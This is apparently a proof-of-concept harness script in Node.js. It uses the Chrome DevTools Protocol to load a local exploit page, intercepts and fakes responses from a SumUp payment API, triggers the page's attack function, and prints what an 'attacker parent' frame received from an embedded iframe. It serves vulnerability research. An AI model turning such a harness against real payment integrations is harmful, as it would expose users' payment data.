const CDP_PORT = 9222;
const TARGET = "http://127.0.0.1:8099/poc.html";
const intercepted = [];
const netEvents = [];
let mid = 0;
const pending = new Map();

function connect(url) {
  return new Promise((res, rej) => {
    const ws = new WebSocket(url);
    ws.onopen = () => res(ws);
    ws.onerror = (e) => rej(e);
  });
}
function send(ws, method, params = {}) {
  const id = ++mid;
  return new Promise((res) => { pending.set(id, res); ws.send(JSON.stringify({ id, method, params })); });
}
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

(async () => {
  let page;
  for (let i = 0; i < 40; i++) {
    try {
      const r = await fetch(`http://127.0.0.1:${CDP_PORT}/json/new?${encodeURIComponent(TARGET)}`, { method: "PUT" });
      page = await r.json(); break;
    } catch (e) { await sleep(500); }
  }
  if (!page) { console.log("FAIL: no CDP target"); process.exit(1); }
  const ws = await connect(page.webSocketDebuggerUrl);
  ws.onmessage = async (m) => {
    const msg = JSON.parse(m.data);
    if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg.result); pending.delete(msg.id); return; }
    if (msg.method === "Fetch.requestPaused") {
      const p = msg.params;
      intercepted.push({
        url: p.request.url, method: p.request.method,
        headers: Object.fromEntries(Object.entries(p.request.headers).map(([k,v])=>[k,v])),
        postData: p.request.postData
      });
      const body = JSON.stringify({ id: "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee", status: "PENDING", next_step: null });
      await send(ws, "Fetch.fulfillRequest", {
        requestId: p.requestId, responseCode: 200,
        responseHeaders: [{ name: "Content-Type", value: "application/json" }, { name: "Access-Control-Allow-Origin", value: "*" }],
        body: Buffer.from(body).toString("base64")
      });
    }
    if (msg.method === "Network.requestWillBeSent") {
      netEvents.push({ url: msg.params.request.url, method: msg.params.request.method });
    }
  };
  await send(ws, "Network.enable");
  await send(ws, "Fetch.enable", { patterns: [{ urlPattern: "*api.sumup.com*", requestStage: "Request" }] });
  await sleep(6000);

  const fired = await send(ws, "Runtime.evaluate", { expression: "fire()", returnByValue: true });
  console.log("FIRE:", JSON.stringify(fired?.result?.value ?? fired?.result ?? fired));
  await sleep(5000);

  const got = await send(ws, "Runtime.evaluate", { expression: "JSON.stringify(window.received,null,1)", returnByValue: true });
  const iframeOrigin = await send(ws, "Runtime.evaluate", { expression: "document.getElementById('f').contentWindow.location.href", returnByValue: true });
  const referrer = await send(ws, "Runtime.evaluate", { expression: "JSON.stringify({page:location.href})", returnByValue: true });

  console.log("=== INTERCEPTED api.sumup.com REQUESTS ===");
  console.log(JSON.stringify(intercepted, null, 1));
  console.log("=== MESSAGES RECEIVED BY ATTACKER PARENT ===");
  console.log(got?.result?.value);
  console.log("=== iframe location (origin gate observable) ===");
  console.log(JSON.stringify(iframeOrigin?.result ?? iframeOrigin));
  ws.close();
  process.exit(0);
})().catch(e => { console.log("ERR", e.message || e); process.exit(1); });
